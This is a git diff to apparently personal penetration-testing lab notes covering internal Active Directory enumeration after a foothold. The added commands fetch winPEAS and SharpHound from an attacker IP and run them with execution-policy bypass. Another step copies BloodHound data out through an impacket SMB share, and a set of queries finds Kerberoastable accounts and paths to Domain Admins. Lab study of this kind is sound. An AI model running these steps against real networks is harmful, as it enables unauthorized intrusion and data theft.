@@ -2756,11 +2756,86 @@ WEBSRV1 (gained access)
       `PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig` #172.16.6.243
   - landed on the **CLIENTWK1** system as domain user **marcus** : internal network 172.16.6.243/24  
 - **Enumerating** the internal network
-  - dd
-  - dd
-  - dd
-  - dd
-  - dd
+  - Run winPEASx64.exe
+    ```
+    PS C:\Windows\System32\WindowsPowerShell\v1.0> cd C:\Users\marcus
+	PS C:\Users\marcus> iwr -uri http://192.168.45.189/winPEASx64.exe -Outfile winPEASx64.exe
+	PS C:\Users\marcus> .\winPEASx64.exe | Out-File winPEAS-results.txt
+    ```
+  - Run Sharphound.exe
+    ```
+    PS C:\Users\marcus> iwr -uri http://192.168.45.189/SharpHound.exe -Outfile SharpHound.exe
+	PS C:\Users\marcus> powershell -ep bypass
+	PS C:\Users\marcus> . .\SharpHound.exe
+    ```
+  - Copy results to kali
+    ```
+    #kali
+	impacket-smbserver test . -smb2support  -username random_user -password random_password
+	
+	#target
+	PS C:\Users\marcus> net use m: \\192.168.45.189\test /user:random_user random_password
+	PS C:\Users\marcus> copy C:\users\marcus\20250830045215_BloodHound.zip m:\
+    ```
+  - Kali: start bloodhound
+    `sudo ./bloodhound-cli install`  
+  - Analyze bloodhound results
+    - machines
+      `MATCH (m:Computer) RETURN m`
+    - users
+      `MATCH (m:User) RETURN m`
+  - Enumerating services and sessions
+    - Bloodhount useful query
+      ```
+      #Find all Kerberoastable Accounts
+      MATCH (u:User {hasspn:true}) RETURN u
+
+      #Find all AS-REP Roastable Accounts
+      MATCH (u:User {dontreqpreauth:true}) RETURN u
+
+      #Find Users with Default Passwords (rare but checks pwdneverexpires)
+      MATCH (u:User {passwordnotreqd:true}) RETURN u
+
+      #Find all Domain Admins
+      MATCH (n:Group {name:'DOMAIN ADMINS@<DOMAIN>'}) RETURN n
+
+      #Find Computers where Domain Users are Local Admin
+      MATCH (g:Group {name:'DOMAIN USERS@<DOMAIN>'})-[:AdminTo]->(c:Computer) RETURN g,c
+
+      #Find Workstations where Domain Users can RDP
+      MATCH (g:Group {name:'DOMAIN USERS@<DOMAIN>'})-[:CanRDP]->(c:Computer) RETURN g,c
+
+      #Find Servers where Domain Users can RDP
+      MATCH (g:Group {name:'DOMAIN USERS@<DOMAIN>'})-[:CanRDP]->(c:Computer) RETURN g,c
+
+      #Find Computers where High Value Users are Local Admin
+      MATCH (u:User {highvalue:true})-[:AdminTo]->(c:Computer) RETURN u,c
+
+      #Find All Domain Admin Sessions
+      MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@<DOMAIN>'}), (c:Computer)-[:HasSession]->(u) RETURN c,u
+
+      #Find Computers with Active Sessions
+	  MATCH (c:Computer)-[:HasSession]->(u:User) RETURN c,u
+
+      #Shortest Paths to Domain Admins
+      MATCH (n:User),(m:Group {name:'DOMAIN ADMINS@<DOMAIN>'}),
+	  p=shortestPath((n)-[r*1..]->(m))
+	  RETURN p
+
+      #Shortest Paths to High Value Targets
+      MATCH (n:User),(m:Group {highvalue:true}),
+      p=shortestPath((n)-[r*1..]->(m))
+      RETURN p
+
+      #All Domain Admins from Owned Principals
+      MATCH (n {owned:true}),(m:Group {name:'DOMAIN ADMINS@<DOMAIN>'}),
+      p=shortestPath((n)-[r*1..]->(m))
+      RETURN p
+      ```
+    - List all Kerberoastable Accounts pre-built query in BloodHound
+      `MATCH (n:User {hasspn:true}) RETURN n`
+    - 
+  - dddd
 - Attack an internal **web application**
 - Gaining access to the **Domain controller**
 
